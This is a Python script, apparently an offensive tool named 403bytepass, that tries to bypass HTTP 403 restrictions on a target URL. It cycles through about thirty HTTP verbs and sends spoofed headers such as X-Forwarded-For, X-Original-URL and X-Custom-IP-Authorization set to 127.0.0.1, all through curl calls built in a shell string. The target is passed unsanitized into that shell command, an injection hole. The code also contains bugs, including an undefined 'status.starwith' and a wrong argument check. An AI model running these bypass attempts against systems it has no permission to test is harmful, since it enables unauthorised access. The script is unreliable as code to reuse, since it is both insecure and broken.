import sys
from os import popen



class bcolors:
	OK = '\033[92m'
	INFO = '\033[94m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	RESET = '\033[0m'

def banner():
        print(bcolors.WARNING+'''
  ____  ___   ____  ___         __                          
 / / / / _ \ |_  / / _ ) __ __ / /_ ___  ___  ___ _ ___  ___
/_  _// // /_/_ < / _  |/ // // __// -_)/ _ \/ _ `/(_-< (_-<
 /_/  \___//____//____/ \_, / \__/ \__// .__/\_,_//___//___/
                       /___/          /_/                   
               .--.
              |.-. '----------.
              |'-' .--"--""--"/
               '--'
        '''+bcolors.RESET)



def curl_fct(options,test):
	command = popen("curl -k -s -I %s %s | grep HTTP | tail -1" % (options, test)).read()

	try:
		code = command.strip().split(" ")[1]
	except:
		print(bcolors.FAIL+"[!]"+bcolors.RESET+"No status code")
		sys.exit(1)

	if code == "200":
		command = bcolors.OK+command+bcolors.RESET

	elif code.startswith("30"):
		command = bcolors.WARNING+command+bcolors.RESET
	
	elif code.startswith("40") or status.starwith("50"):
		command = bcolors.FAIL+command+bcolors.RESET
	return command

def main():

	if len(sys.argv)>2:
		print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: python3 403bytepass.py <target>")
		sys.exit(1)


	target = sys.argv[1]
	
	if not target.startswith("http"):
		print(bcolors.FAIL+"[!]"+bcolors.RESET+"URL must start with http:// or https://")
		print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: 403python3 bytepass.py <target>")
		sys.exit(1)

	SlashCheck = target.count("/")
	if target.endswith("/"):
		SlashCheck = SlashCheck-1
		print(target)

	else:
		print(target+"/")

	if SlashCheck == 2:
		uri = ""
	else:
		print(bcolors.FAIL+"[!]"+bcolors.RESET+"URL must start with http:// or https://")
		print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: python3 403bytepass.py <target>")
		sys.exit(1)
	try:
		print(bcolors.OK+"[+]"+bcolors.RESET+"Trying bypass with verb tampering")
		test = target+"/"+uri
		print("ACL ",curl_fct("-X ACL",test))
		print("ARBITRARY ",curl_fct("-X ARBITRARY",test))
		print("BASELINE-CONTROL: ",curl_fct("-X BASELINE-CONTROL",test))
		print("CHECKIN: ",curl_fct("-X CHECKIN",test))
		print("CHECKOUT: ",curl_fct("-X CHECKOUT",test))
		print("CONNECT ",curl_fct("-X CONNECT",test))
		print("COPY ",curl_fct("-X COPY",test))
		print("GET ",curl_fct("-X GET",test))
		print("HEAD: ",curl_fct(" -X HEAD -m 1",test))
		print("LABEL: ",curl_fct(" -X LABEL",test))
		print("LOCK: ",curl_fct(" -X LOCK",test))
		print("MERGE: ",curl_fct(" -X MERGE",test))
		print("MKACTIVITY: ",curl_fct(" -X MKACTIVITY",test))
		print("MKCOL: ",curl_fct(" -X MKCOL",test))
		print("MKWORKSPACE: ",curl_fct(" -X MKWORKSPACE",test))
		print("MOVE: ",curl_fct(" -X MOVE",test))
		print("OPTIONS: ",curl_fct(" -X OPTIONS",test))
		print("ORDERPATCH: ",curl_fct(" -X ORDERPATCH",test))
		print("PATCH: ",curl_fct(" -X PATCH",test))
		print("POST: ",curl_fct(" -X POST",test))
		print("PROPFIND: ",curl_fct(" -X PROPFIND",test))
		print("PROPPATCH: ",curl_fct(" -X PROPPATCH",test))
		print("PUT: ",curl_fct(" -X PUT",test))
		print("REPORT: ",curl_fct(" -X REPORT",test))
		print("SEARCH: ",curl_fct(" -X SEARCH",test))
		print("TRACE: ",curl_fct(" -X TRACE",test))
		print("UNCHECKOUT: ",curl_fct(" -X UNCHECKOUT",test))
		print("UNLOCK: ",curl_fct(" -X UNLOCK",test))
		print("UPDATE: ",curl_fct(" -X UPDATE",test))
		print("VERSION-CONTROL: ",curl_fct(" -X VERSION-CONTROL",test))
		
		print("\n")
		print(bcolors.OK+"[+]"+bcolors.RESET+"Try bypass with header")
		print("Referer: ",curl_fct(" -X GET -H \"Referer: "+test+"\"",test))
		print("X-Custom-IP-Authorization: ",curl_fct(" -X GET -H \"X-Custom-IP-Authorization: 127.0.0.1\"",test))
		test=target+"/"+uri+"..\;"
		print("X-Custom-IP-Authorization + ..;: ",curl_fct(" -X GET -H \"X-Custom-IP-Authorization: 127.0.0.1\"",test))
		test=target+"/"
		print("X-Original-URL: ",curl_fct(" -X GET -H \"X-Original-URL: /"+uri+"\"",test))
		print("X-Rewrite-URL: ",curl_fct(" -X GET -H \"X-Rewrite-URL: /"+uri+"\"",test))
		test=target+"/"+uri
		print("X-Originating-IP: ",curl_fct(" -X GET -H \"X-Originating-IP: 127.0.0.1\"",test))
		print("X-Forwarded-For: ",curl_fct(" -X GET -H \"X-Forwarded-For: 127.0.0.1\"",test))
		print("X-Remote-IP: ",curl_fct(" -X GET -H \"X-Remote-IP: 127.0.0.1\"",test))
		print("X-Client-IP: ",curl_fct(" -X GET -H \"X-Client-IP: 127.0.0.1\"",test))
		print("X-Host: ",curl_fct(" -X GET -H \"X-Host: 127.0.0.1\"",test))
		print("X-Forwarded-Host: ",curl_fct(" -X GET -H \"X-Forwarded-Host: 127.0.0.1\"",test))
		
		print(bcolors.OK+"[+]"+bcolors.RESET+"Tests finished")
	except Exception as e:
		print(e)
	except KeyboardInterrupt:
		print(bcolors.FAIL+"[!]"+bcolors.RESET+"Key Interruption: Coming back home")
banner()
main()
